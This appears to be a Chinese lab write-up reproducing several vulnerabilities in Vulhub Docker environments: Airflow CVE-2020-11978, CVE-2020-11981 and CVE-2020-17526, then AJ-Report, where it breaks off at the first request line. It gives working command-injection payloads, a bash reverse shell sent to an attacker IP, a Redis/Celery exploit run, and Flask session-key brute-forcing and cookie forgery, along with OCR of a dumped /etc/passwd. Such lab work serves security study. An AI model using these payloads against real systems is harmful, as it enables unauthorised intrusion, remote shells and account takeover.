TASKSTARTER.RUN SEND GREETING FROM SERVER 05:23:37 TASKSTARTER.RUN USERNAME: FILEREAD_/ETC/PASSWD 05:23:37 [THREAD-1] [THREAD-1] TASKSTARTER.RUN MODE: FILE READ 05:23:37 [THREAD-1] 05:23:37 READFILERESOLVER.RESOLVE READ FILE: /ETC/PASSWD [THREAD-1] 05:23:37 READFILERESOLVER.RESOLVE WRITE SUCCESS: 919 READFILERESOLVER.RESOLVE FILE IS NULL 05:23:37 [THREAD-1] READFILERESOLVER.RESOLVE READ FILE FINISH 05:23:37 [THREAD-1] -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803697151-c54db1cf-749a-4bd6-8d89-29490cace90a.png)

<!-- 这是一张图片，ocr 内容为：-(KATISKALI)-[~/DOWNLOADS/FAKE-SERVER-FILES/1719048217280] GAD CAT PASSWD USE:JAVA-JAR USE:DESER CUSTOM ROOT:X:0:0:ROOT://ROOT://BIN/BASH DAEMON:X:1:1:DAEMON://USR/SBIN://USR/SBIN/NOLOGIN ##################################################################################################### BIN:X:2:2:BIN://BIN:/USR/SBIN/NOLOGIN WARNING:SUN.REFLECT.REFLECTION.G SYS:X:3:3:SYS://DEV:/USR/SBIN/NOLOGIN PACT PERTORMANCE. SYNC:X:4:65534:SYNC://BIN://BIN/SYNC 05:21:15 LMAINJ MYSQLSERVER.START GAMES:X:5:60:GAMES://USR/GAMES://USR/SBIN/NOLOGIN 23:37 [MAIN] MYSQLSERVER.START MAN:X:6:12:MAN://VAR/CACHE/MAN://USR/SBIN/NOLOGIN [THREAD-0] TASKSTA 23:37 LP:X:7:7:LP://VAR/SPOOL/LPD://USR/SBIN/NOLOGIN [THREAD-0] TASKSTARTER. MAIL:X:8:8:MAIL:/VAR/MAIL://USR/SBIN/NOLOGIN [THREAD-0] TASKSTARTER NEWS:X:9:9:NEWS://VAR/SPOOL/NEWS://USR/SBIN/NOLOGIN [THREAD-0] UUCP:X:10:10:UUCP://VAR/SPOOL/UUCP://USR/SBIN/NOLOGIN READF1LERESO [THREAD-0] PROXY:X:13:13:PROXY://BIN://SBIN/NOLOGIN WWW-DATA:X:33:33:WWW-DATA:/VAR/WWW://USR/SBIN/NOLOGIN [THREAD-0] BACKUP:X:34:34:BACKUP://VAR/BACKUPS://UST/SBIN/NOLOGIN LIST:X:38:38:MAILING LIST MANAGER://VAR/LIST://UST/SBIN/NOLOGIN SOLSERVERAR IRC:X:39:39:IRCD://VAR/RUN/IRCD://USR/SBIN/NOLOGIN /USR/SBIN/NOL (ADMIN)://VAR/LIB/GNATS: GNATS:X:41:41:GNATS BUG-REPORTING SYSTEM OGIN NOBODY:X:65534:65534:NOBODY:/NONEXISTENT://USI/SBIN/NOLOGIN APT:X:100:65534:://NONEXISTENT://BIN/FALSE -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803697163-89452ceb-c6dc-46b1-a980-f957be08bc43.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Apache Airflow </font><font style="color:#1f2328;background-color:#FFFFFF;">示例</font><font style="color:#1f2328;background-color:#FFFFFF;">dag</font><font style="color:#1f2328;background-color:#FFFFFF;">中的命令注入（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2020-11978</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">由于启动的组件比较多，可能会有点卡，运行此环境可能需要准备</font><font style="color:#1f2328;background-color:#FFFFFF;">2G</font><font style="color:#1f2328;background-color:#FFFFFF;">以上的内存。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">依次执行如下命令启动</font><font style="color:#1f2328;background-color:#FFFFFF;">airflow 1.10.10</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

```plain
#初始化数据库
docker compose run airflow-init
#启动服务
docker compose up -d
```

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">访问</font><font style="color:#1f2328;">http://your-ip:8080</font><font style="color:#1f2328;background-color:#FFFFFF;">进入</font><font style="color:#1f2328;background-color:#FFFFFF;">airflow</font><font style="color:#1f2328;background-color:#FFFFFF;">管理端，将</font><font style="color:#1f2328;">example_trigger_target_dag</font><font style="color:#1f2328;background-color:#FFFFFF;">前面的</font><font style="color:#1f2328;background-color:#FFFFFF;">Off</font><font style="color:#1f2328;background-color:#FFFFFF;">改为</font><font style="color:#1f2328;background-color:#FFFFFF;">On</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.134:8080/ADMIN/ EXPLOIT-DB KALI LINUX KALI TOOLS KALI TRAINING MSFU OTHER BOOKMARKS KALI FORUMS OFFENSIVE SECURITY KALI DOCS NETHUNTER AIRFLOW DOCS 2024-06-22 10:32:42 UTC DAGS ADMIN BROWSE ABOUT DATA PROFILING EXAMPLE PASSING PALAMS VIA LEST COMMAND AINOW 10 AIRFLOW 2 EXAMPLE PIG OPERATOR OFF NONE AIRFLOW LOU EXAMPLE PYTHON_OPERATOR NONE AIRFLOW ?美小小小三 OF EXAMPLE SHORT CIRCUIT OPERATOR 1 DAY.0:00:00 AIRFLOW EXAMPLE SKIP DAG OFF 1 DAY,0:00:00 AIRFLOW OIF EXAMPLE_SUBDAG_OPERATOR ONCE AIRFLOW EXAMPLE_TRIGGER_CONTROLLER_DAG OFF @ONCE G EXAMPLETRIGGER_TARGET_DAG 中寨山山小三 AIRFLOW NONE ON AIRFLOW EXAMPLE XCOM OIF &ONCE LATEST_ONLY AIRFLOW OFF 4:00:00 LATEST_ONLY_WITH_TRIGGER & AIRFLOW OFF 4:00:00 中国小小三 AIRFLOW OFF TEST UTILS NONE AIRFLOW TUTORIAL OFF 1 DAY.0:00:00 SHOWING 1 TO 21 OF 21 ENTRIES -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803697210-94d55759-fa4f-4ba8-af6d-f59ab8419c7a.png)

<font style="color:#1f2328;background-color:#FFFFFF;">再点击执行按钮，在</font><font style="color:#1f2328;background-color:#FFFFFF;">Configuration JSON</font><font style="color:#1f2328;background-color:#FFFFFF;">中输入：</font><font style="color:#1f2328;">{"message":"'\";touch /tmp/airflow_dag_success;#"}</font><font style="color:#1f2328;background-color:#FFFFFF;">，再点</font><font style="color:#1f2328;">Trigger</font><font style="color:#1f2328;background-color:#FFFFFF;">执行</font><font style="color:#1f2328;background-color:#FFFFFF;">dag</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

<!-- 这是一张图片，ocr 内容为：TRIGGER DAG: EXAMPLE_TRIGGER_TARGET_DAG N JSON(OPTIONAL) CONFIGURATION JS T'MESSAGE""",TOUCH /TMP/AIRFLOW_DAG_SUCCESS#" TRIGGER BAIL. -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803698306-9df95aa3-b43e-476f-a490-dd136faf0c1f.png)

<font style="color:#1f2328;background-color:#FFFFFF;">等几秒可以看到执行成功：</font>

<!-- 这是一张图片，ocr 内容为：EXAMPLE_TRIGGER_CONTROLLER_DAG OF AIRTIOW AONCE C AIRTIOW 2021-07-01 06:28 EXAMPLE_TRIGGER_TARGET_DAG NONE ON -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803698585-f9a67fa0-7b53-4974-948a-291a736b7bb1.png)

<font style="color:#1f2328;background-color:#FFFFFF;">到</font><font style="color:#1f2328;background-color:#FFFFFF;">CeleryWorker</font><font style="color:#1f2328;background-color:#FFFFFF;">容器中进行查看：</font>

```plain
docker compose exec airflow-worker ls -l /tmp
```

<font style="color:#1f2328;background-color:#FFFFFF;">可以看到</font><font style="color:#1f2328;">touch /tmp/airflow_dag_success</font><font style="color:#1f2328;background-color:#FFFFFF;">成功被执行：</font>

<!-- 这是一张图片，ocr 内容为： AIRFLOW-WORKER LS  SUDO DOCKER-COMPOSE EXEC AIRF [CENTOS@LOCALHOST CVE-2020-11978]$ -1/TMP [SUDO] PASSWORD FOR CENTOS: TOTAL 0 AIRFLOW AIRFLOW 10:38 AIRFLOW_DAG_SUCCESS O JUN 22 124 -IW-1-1-- 6 JUN 22 10:27 PYMP-ZFB6OFRS AIRFLOW AIRFLOW DRWX 103 2 2020 TMP.M9QD2FWWWO APR DRWX ROOT ROOT -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803699160-6aab421b-16ec-40f4-bce4-bde12e60fd60.png)

## <font style="color:#1a1a1a;">NC反弹shell</font>
<font style="color:#333333;">攻击机</font><font style="color:#333333;">192.168.254.130</font><font style="color:#333333;">开启</font><font style="color:#333333;">nc</font><font style="color:#333333;">，监听</font><font style="color:#333333;">6666</font><font style="color:#333333;">端口</font>

<!-- 这是一张图片，ocr 内容为：-(KALI)-[~[~[~]  NC -LVP 666 LISTENING ON [ANY] 6666 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803699364-bd328f79-3ac9-451f-8fd9-2cd45c52f9ea.png)

<font style="color:#333333;">在Configuration JSON中输入：</font>

```plain
{"message":"'\";bash -i >& /dev/tcp/192.168.254.130/6666 0>&1;#"}
```

<!-- 这是一张图片，ocr 内容为：192.168.254.134:8080/ADMIN/AIRFLOW/TRIGGER?DAG 贝 KALI DOCS KALI FORUMS NETHUNTER KALI TRAINING KALI TOOLS KALI LINUX AIRFLOW BROWSE ABOU DAGS ADMIN DATA PROFILING DOCS TRIGGER DAG:EXAMPLE_TRIGGER_TARGET_D T_DAG CONFIGURATION JSON(OPTIONAL) [MESSAGE":BASH-I>&/DEV/TEP/192.168.254.130/666666 0>&1:# TRIGGER BAIL. -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803699510-197909f1-bf73-4bb8-95a6-b15c5f5723ac.png)

<font style="color:#333333;">成功监听</font>

<!-- 这是一张图片，ocr 内容为：-(KALIGKALI)-[~] NC-LVP 6666 LISTENING ON [ANY] 6666 192.168.254.134: INVERSE HOST LOOL FAILED:UNKNOWN HOST LOOKUP FI FROM (UNKNOWN) [192.168.254.134] 49752 [192.168.254.130] CONNECT TO [ SET TERMINAL PROCESS GROUP (985): INAPPROPRIATE IOCTL FOR DEVICE BASH:CANNOT BASH: NO JOB CONTROL IN THIS SHELL AIRFLOW@B380C297429E:/TMP/AIRFLOWTMPQOWJB1Q8$ WHOAMI WHOAMI AIRFLOW AIRFLOW@B380C297429E://TMP/AIRFLOWTMPQOWJB1Q8$ E-2020-11978 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803699696-532e5aa2-ea7a-4b69-aa61-5cd281559a82.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Apache Airflow Celery </font><font style="color:#1f2328;background-color:#FFFFFF;">消息中间件命令执行（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2020-11981</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">依次执行如下命令启动</font><font style="color:#1f2328;background-color:#FFFFFF;">airflow 1.10.10</font>

```plain
#初始化数据库
docker compose run airflow-init
#启动服务
docker compose up -d
```

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞利用</font>
<font style="color:#1f2328;background-color:#FFFFFF;">利用这个漏洞需要控制消息中间件，</font><font style="color:#1f2328;background-color:#FFFFFF;">Vulhub</font><font style="color:#1f2328;background-color:#FFFFFF;">环境中</font><font style="color:#1f2328;background-color:#FFFFFF;">Redis</font><font style="color:#1f2328;background-color:#FFFFFF;">存在未授权访问。通过未授权访问，攻击者可以下发自带的任务</font><font style="color:#1f2328;">airflow.executors.celery_executor.execute_command</font><font style="color:#1f2328;background-color:#FFFFFF;">来执行任意命令，参数为命令执行中所需要的数组。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">我们可以使用</font>[exploit_airflow_celery.py](https://github.com/vulhub/vulhub/blob/master/airflow/CVE-2020-11981/exploit_airflow_celery.py#tdsub)<font style="color:#1f2328;background-color:#FFFFFF;">这个小脚本来执行命令</font><font style="color:#1f2328;">touch /tmp/airflow_celery_success</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

```plain
pip install redis 
python exploit_airflow_celery.py [your-ip]
```

<!-- 这是一张图片，ocr 内容为：-(KALIGKALI)-{~/DESKTOP/VULHUB-MASTER/AIRFLOW/CVE-2020-11981] PYTHON3 -M VENV VENV -(KALISKALI)-[~/DESKTOP/VULHUB-MASTER/AIRFLOW/CVE-2020-11981] SOURCE VENV/BIN/ACTIVATE -(VENV)-(KATISKALI)-[/DESKTOP/VULHUB-MASTER/AIRFLOW/C CVE-202020-11981 PIP I  INSTALL REDIS LOOKING IN INDEXES: HTTPS://PYPI.TUNA.TSINGHUA.EDU.CN/SIMPLE COLLECTING REDIS DOWNLOADING HTTPS://PYPI.TUNA.TSINGHUA.EDU.CN/PACKAGES/D5/D5/96/00BLAFD9AD789E 6571AD1782EF67957BF96A79 96A79B58FAB166F1669FA853554/REDIS-5.0.6-PY3-NONE-ANY.WHL ( 252 KB) 252.0/252.0 KB 2.2 MB MB/S ETA0:00:00 INSTALLING COLLECTED PACKAGES: REDIS SUCCESSFULLY INSTALLED REDIS-5.0.6 -(VENV)-(KALIGKALI)-{/DESKTOP/VULHUB-MASTER/AIRFLOW/CVE-2020-119811 PYTHON3 EXPLOIT AIRFLOW CELERV.PY 192.168.254.134 DELIVERY_TAG ['CONTENT-ENCODING':'UTF-8', PROPERTIES': {'PRIORITY F29D2B4F-B9D6-4B9A-9EC3-029F9B46E066','DELIVERY_MODE' 'BODY_ENCODING 2, 'CORRELATION_ID':'ED5F75C1-94F7-43E4-AC96-E196CA248BD4 DELIVERY_ BASE64', CELERY', : {'ROUTING_KEY': EXCHANGE': REPLY_TO FB996EEC-3033 INFO': 3C10-9EE1-418ELCA06DB8'}, 'CONTENT-TYPE': 'APPLICATION/JSON' HEADERS LI 'ARGSREPR': '(100, 200)' TRIES': 0, 'LANG': 'PY', NONE EXPIRES TASK AIRFLOW.EXECUTORS.CELERY EXECUTOR.EXECUTE.COMMAND', KWARGSREPR ROOT _ID': 'ED5F75C1-94F7-43E4-AC96-E196CA248BD4', ED5F7 , 'PARENT_ID': NONE, 1D 5C1-94F7-43E4-AC96-E196CA248BD4', 'O , 'ORIGIN' NONE, ETA GEN1@132F65270CDE 'GROUP': NONE, 'TIMELIMIT': [NONE, N , NONE] 'BODY': W1TBINRVDWNOIIWGII90BXAV YWLYZMXVD19JZNX1CNLFC3V3YZVZCYJDXSWGE30SIHSIY2HHAW4I0IBUDWXSLCAIV2HVCNQIBUD WXSLCAIZXJYYMFJA3MIOIBUDWXSLCAIY2FSBGJHY2TZIJOGBNVSBH1D"于 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803814723-dfc1f2f3-542a-42a5-81ab-4bcfe9fcddd2.png)

<font style="color:#1f2328;background-color:#FFFFFF;">查看结果：</font>

```plain
docker compose logs airflow-worker
```

<!-- 这是一张图片，ocr 内容为：LOGS AIRFLOW-WORKER [CENTOS@LOCALHOST CVE-2020-11981]$ SUDO DOCKER-COMPOSE [SUDO] PASSWORD FOR CENTOS: CVE-2020-11981-AIRFLOW-WORKER-1 DB BACKEND-POSTGRESQL+PSYCOPG2 DB HOST POSTGRES CVE-2020-11981-AIRFLOW-WORKER-1 CVE-2020-11981-AIRFLOW-WORKER-1 DB PORT-5432 CVE-2020-11981-AIRFLOW-WORKER-1 DB_BACKEND-POSTGRESQL+PSYCOPG2 CVE-2020-11981-AIRFLOW-WORKER-1 DB HOST-POSTGRES CVE-2020-11981-AIRFLOW-WORKER-1 DB PORT-5432 CVE-2020-11981-AIRFLOW-WORKER-1 CVE-2020-11981-AIRFLOW-WORKER-1 [2024-06-22 10:53:34,647: INFO/MAINPROCESS CVE-2020-11981-AIRFLOW-WORKER-1 ] CONNECTED TO REDIS://REDIS:6379/0 [2024-06-22 10:53:34,841: INFO/MAINPROCESS CVE-2020-11981-AIRFLOW-WORKER-1 ] MINGLE: SEARCHING FOR NEIGHBORS [2024-06-22 10:53:35,999: INFO/MAINPROCESS CVE-2020-11981-AIRFLOW-WORKER-1 ] MINGLE:ALL ALONE CVE-2020-11981-AIRFLOW-WORKER-1 [2024-06-22 10:53:36,281: INFO/MAINPROCESS ] CELERY@4E134D01AAE3 READY. :NONE, EXPIRES': STARTING FLASK CVE-2020-11981-AIRFLOW-WORKER-1 SERVING FLASK APP "AIRFLOW.BIN.CLI" (LA CVE-2020-11981-AIRFLOW-WORKER-1 ZY LOADING) ENVIRONMENT: PRODUCTION CVE-2020-11981-AIRFLOW-WORKER-1 WARNING: THIS IS A DEVELOPMENT SERVER. CVE-2020-11981-AIRFLOW-WORKER-1 DO NOT USE IT IN A PRODUCTION DEPLOYMENT. USE A PRODUCTION WSGI SERVER INSTEAD. CVE-2020-11981-AIRFLOW-WORKER-1 DEBUG MODE:OFF CVE-2020-11981-AIRFLOW-WORKER-1 [2024-06-22 10:53:37,915] [INTERNAL.PY:12 CVE-2020-11981-AIRFLOW-WORKER-1 2} INFO - * RUNNING ON HTTP://0.0.0:8793/ (PRESS CTRL+C TO QUIT) [2024-06-22 10:53:39,013: INFO/MAINPROCESS CVE-2020-11981-AIRFLOW-WORKER-1 ] EVENTS OF GROUP {TASK} ENABLED BY REMOTE. [2024-06-22 11:00:02,315: INFO/MAINPROCESS CVE-2020-11981-AIRFLOW-WORKER-1 ] RECEIVED TASK: AIRFLOW.EXECUTORS.CELERY - ERY EXECUTOR.EXECUTE COMMAND[ED5F75C1-9 4F7-43E4-AC96-E196CA248BD4] [2024-06-22 11:00:02,329: INFO/FORKPOOLWOR CVE-2020-11981-AIRFLOW-WORKER-1 KER-15] EXECUTING COMMAND IN CELERY: 'TOUCH', /TMP/AIRFLOW CELERY SUCCESS'] [2024-06-22 11:00:02,853: INFO/FORKPOOLWOR CVE-2020-11981-AIRFLOW-WORKER-1 KER-15] TASK AIRFLOW.EXECUTORS.CELERY-EXECUTOR.EXECUTE-CONMAND[ED5F75C1-94F7- 43E4-AC96-E196CA248BD4] SUCCEEDED IN 0.5256049949998669S: NONE -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803814812-0ce61109-40ad-4600-afaf-a7ce71ea2d8a.png)

<font style="color:#1f2328;background-color:#FFFFFF;">可以看到如下任务消息：</font>

```plain
docker compose exec airflow-worker ls -l /tmp
```

<font style="color:#1f2328;background-color:#FFFFFF;">可以看到成功创建了文件</font><font style="color:#1f2328;">airflow_celery_success</font>

<!-- 这是一张图片，ocr 内容为：[CENTOSALOCALHOST CVE-2020-11981]$ SUDO DOCKER-COMPOSE EXEC AIRFLOW-WORKER LS -L/TMP ER-COMPOSE LOGS AIRTLOW-WORKER [SUDO] PASSWORD FOR CENTOS: LAGES/PARAMIKO/TRANSPORT.PY:219: CRYPTOGRAPHYDEPRECA TOTAL 0/PYTHON3/DIST-PACKAGE N 22 11:00 AIRFLOW_CELERY_SUCCESS AIRFLOW AIRFLOW OJUN -IM-I- AIRFLOW AIRFLOW 6 JUN 22 10:53 PYMP-5ETOMHS2 XMUP 103 APR 2020 TMP.M9QD2FWWW0 ROOT DRWX ROOT -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803814450-a4166c27-4c29-44a6-b341-b213994e3a8c.png)

<font style="color:#333333;">退出虚拟环境：</font>

<!-- 这是一张图片，ocr 内容为：-(VENV)-(KALI@KALI)-[/DESKTOP/VULHUB-MASTER/AIRFLOW/CVE-2020-11981) 6JUN 22 10:53 PYMP-5ETOMHS2 DEACTIVATE RFLOW AIRT LOW -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803814445-39e9f7a2-854e-4b5e-83d1-e7cb3dcca7b0.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Apache Airflow </font><font style="color:#1f2328;background-color:#FFFFFF;">默认密钥导致的权限绕过（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2020-17526</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动一个</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache Airflow 1.10.10</font><font style="color:#1f2328;background-color:#FFFFFF;">服务器：</font>

```plain
#Initialize the database
docker compose run airflow-init
#Start service
docker compose up -d
```

<font style="color:#1f2328;background-color:#FFFFFF;">服务器启动后，访问</font><font style="color:#1f2328;">http://your-ip:8080</font><font style="color:#1f2328;background-color:#FFFFFF;">即可查看到登录页面。</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080/ADMIN/AIRFLOW/LOGIN?NEXT%2FADMIN%2F KALI TRAINING KALI FORUMS KALI DOCS OFFENSIVE SECURITY MSFU KALI TOOLS KALI LINUX NETHUNTER AIRFLOW DAGS DOCS INCORRECT LOGIN DETAILS SIGN IN TO AIRFLOW USERNAME PASSWORD SIGN IN REMEMBER ME -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803814470-a801832f-9a1f-42e4-a631-88f3b3351bad.png)

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞利用</font>
<font style="color:#1f2328;background-color:#FFFFFF;">首先，我们访问登录页面，服务器会返回一个签名后的Cookie：</font>

<!-- 这是一张图片，ocr 内容为：-(KALI@KALI)-[~] CURL -V HTTP://192.168.254.135:8080/ADMIN/AIRFLOW/LOGIN TRYING 192.168.254.135:8080. 大 CONNECTED TO 192.168.254.135 (192.168.254.135) PORT 8080 GET /ADMIN/AIRFLOW/LOGIN HTTP/1.1 HOST: 192.168.254.135:8080 USER-AGENT: CURL/8.7.1 STEQSOLVE.JAR KA > ACCEPT: */* REQUEST COMPLETELY SENT OFF HTTP/1.1 200 OK SERVER:GUNICORN/19.10.0 STER/AIRFLOW/CVE-2020-11981 DATE: SAT, 22 JUN 2024 14:05:17 GMT CONNECTION:CLOSE HELD CONTENT-TYPE: TEXT/HTML; CHARSET-UTF-8 MASTER/AIRFLOW/CVE-2020-11981 CONTENT-LENGTH:7750 VARY:COOKIE : SET-COOKIE: SESSION-EYJJC3JMX3RVA2VUIJOIZTI2NNM3ODESZTIZ0GY4N2YOM2NIYMFJMFJM2M 00DK5YZNZZTK5YZKYYI39.ZNBAHQ.9765WS2RJUHKYFESWZYXFSJNFZ8; HTTPONLY; PATHZ/ -(KALICKALI)-[~/DESKTOP/VULHUB-MASTER/AIRFLOW/CVE-2020-11981] -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803815569-a5001608-5c92-438a-b8c5-251f5755ca95.png)

<font style="color:#1f2328;background-color:#FFFFFF;">然后，使用</font>[flask-unsign](https://github.com/Paradoxis/Flask-Unsign#tdsub)<font style="color:#1f2328;background-color:#FFFFFF;">这个工具来爆破签名时使用的</font><font style="color:#1f2328;">SECRET_KEY</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

<!-- 这是一张图片，ocr 内容为：-(VENV)-(KALIGKALI)-[~/DESKTOP/VULHUB-MASTER/AIRFLOW/CVE-2020-17526) L$ FLASK-UNSIGN -U -C EYJC3JMX3RVA2VUIJOIZTI2NMMMMM3ODESZTIZOGYAN2YOM2NIYMFJN2 MOODK5YZMZZTK5YZKYYI39.ZNBAHQ.Q7GSWS2RJUHKYFE8WZYXFSJNFZ8 [*] SESSION DECODES TO: {'CSRF_TOKEN':'E266C7819E238F87F43CBBAC3C4899C33E99[ 92B1  BACK TO DEFAULT WORDLIST... FALLING [*] NOWORDLIST SELECTED, WITH 8 BRUTE-FORCER STARTING THREADS [*] ATTEMPTED (2304): BEGIN PRIVATE KEY--ECR [*] ATTEMPTED (38784): W.;>{1APBOX_TOKEN_HERE****U9YT ER 53248 ATTEMPTS THINGS1V@0# ORO\VULHUB AINFLOWACVE-2G KEY AFTER FOUND SECRET TEMPORARY KEY A FLASK-UNSIGN -C EYJJC37 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803815515-a8269f18-1d75-42cf-a224-3ff53e011f2d.png)

<font style="color:#1f2328;background-color:#FFFFFF;">Bingo，成功爆破出Key是</font><font style="color:#1f2328;">temporary_key</font><font style="color:#1f2328;background-color:#FFFFFF;">。使用这个key生成一个新的session，其中伪造</font><font style="color:#1f2328;">user_id</font><font style="color:#1f2328;background-color:#FFFFFF;">为1：</font>

<!-- 这是一张图片，ocr 内容为：LHUB-MASTER/AIRFLOW/CVE-2020-17526] (VENV)-(KALISKALI)-[~/DESKTOP/VULHUB-M  FLASK-UNSIGN --SECRET TEMPORARY_KEY Y -C "I'USER_ID':'1','_FRESH':FALSE, 1 -S _PERMANENT':TRUE] EYJ1C2VYX2LKIJOIMSI SIMSISIL9MCMVZACI6ZMFSC2USIL9WZXJTYW5LBNQIONRYDWY9,ZNBE9A.JTY- PRUDTVSS8QICOP8BHDBUW -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803816186-d8e2bc0f-b38a-48c8-9410-b5c3698e0ade.png)

<font style="color:#1f2328;background-color:#FFFFFF;">在浏览器中使用这个新生成的</font><font style="color:#1f2328;background-color:#FFFFFF;">session</font><font style="color:#1f2328;background-color:#FFFFFF;">，可见已成功登录：</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080/ADMIN/AIRFLOW/LOGIN?NEXT%2FADMIN%2F EXPLOIT-DB OTHER BOOKMARKS KALI FORUMS OFFENSIVE SECURITY KALI TOOLS MSFU KALI DOCS KALI LINUX KALI TRAINING NETHUNTER AIRFLOW 2024-06-22 14:41:45 UTC DAGS DOCS INCORRECT LOGIN DETAILS SIGN IN TO AIRFLOW USERNAME PASSWORD SIGN IN 可 X PERFORMANCE DEBUGGER U MEMORY NETWORK APPLICATION ACCESSIBILITY STYLE EDITOR INSPECTOR STORAGE CONSOLE 日 园 CACHE STORAGE FILTER VALUES FILTER LTEMS 日 COOKIES HTTPONLY DOMAIN PATH EXPIRES/MAX-AGE DATA NAME VALUE SAMESITE SECURE LAS SIZE 10.'EYJLC2VYX2LKLJOIMSI..8Q-CGLBAUAK.G5M HTTP://192.168.254.135:8080 92.168.254.. SESSION FALSE TRUE 106 EYJ1C2VYX2LKLJO... SESSION SESSION NONE SAT CREATED:"SAT, 22 JUN 202414:38:55 GMT* INDEXED DB DOMAIN:192.168.254.135" 日 LOCAL STORAGE EXPIRES/MAX-AGE:'SESSION" HOSTONLY.TRUE SESSION STORAGE HTTPONLYTRUE LAST ACCESSED:"SAT.22 JUN 202414:41:42 GMT" PATH:"/ SAMESITE:'NONE" -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803816502-b7926d5c-6692-428d-a4b0-d76392c967c0.png)<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080/ADMIN/ EXPLOIT-DB MSFU KALI TOOLS OFFENSIVE SECURITY NETHUNTER KALI TRAINING KALI DOCS KALI FORUMS OTHER BOOKMARKS KALI LINUX AIRFLOW 2024-06-22 14:42:24UTC ABOUT DOCS BROWSE ADMIN DATA PROFILING DAGS YOU ARE ALREADY LOGGED IN DAGS SEARCH: LAST RUN DAG RUNS RECENT TASKS OWNER SCHEDULE DAG LINKS AIRFLOW EXAMPLE BASH_OPERATOR OFF 00 EXAMPLE BRANCH_DOP_OPERATOR_V3 AIRFLOW OFF AIRFLOW EXAMPLE_BRANCH_OPERATOR OFF @DAILY & 中国小小三 AIRFLOW EXAMPLE COMPLEX OFF NONE OF美山小三 EXAMPLE_EXTERNAL_TASK_MARKER_CHILD AIRFLOW OFF NONE G EXAMPLE_EXTERNAL_TASK_MARKER PARENT AIRFLOW OFF NONE 公 AIRFLOW OFF EXAMPLE HTTP OPERATOR 1 DAY,0:00:00 & EXAMPLE_NESTED_BRANCH_DAG AIRFLOW OFF @DAILY AIRFLOW EXAMPLE_PASSING_PARAMS_VIA TEST COMMAND OFF -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803816674-c7f105bf-4421-483e-b427-668e3e65b71d.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">AJ-Report </font><font style="color:#1f2328;background-color:#FFFFFF;">认证绕过与远程代码执行漏洞（</font><font style="color:#1f2328;background-color:#FFFFFF;">CNVD-2024-15077</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动一个</font><font style="color:#1f2328;background-color:#FFFFFF;">AJ-Report 1.4.0</font><font style="color:#1f2328;background-color:#FFFFFF;">服务器：</font>

```plain
docker compose up -d
```

<font style="color:#1f2328;background-color:#FFFFFF;">服务启动后，你可以在</font><font style="color:#1f2328;">http://your-ip:9095</font><font style="color:#1f2328;background-color:#FFFFFF;">查看到登录页面。</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.135:9095/INDEX.HTML#/LOGIN MSFU EXPLOIT-DB OFFENSIVE SECURITY KALI TRAINING KALI TOOLS OTHER BOOKMARKS KALI LINUX KALI FORUMS KALI DOCS NETHUNTER 说明 AJ-REPORT 社区 文档 HELLO. 在线大屏 用户名 因为专业,懂你所需 用户名 用户名必填 由于专注,想你所想 密码 SPS 香椒丝 用户密码 按灯拉动 委外加工件 记住密码 断点处理 登录 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803817150-30abbd15-cfdb-40d0-b5aa-ea0a98060aa2.png)

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">要利用该漏洞，只需要发送如下数据包：</font>

```plain
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
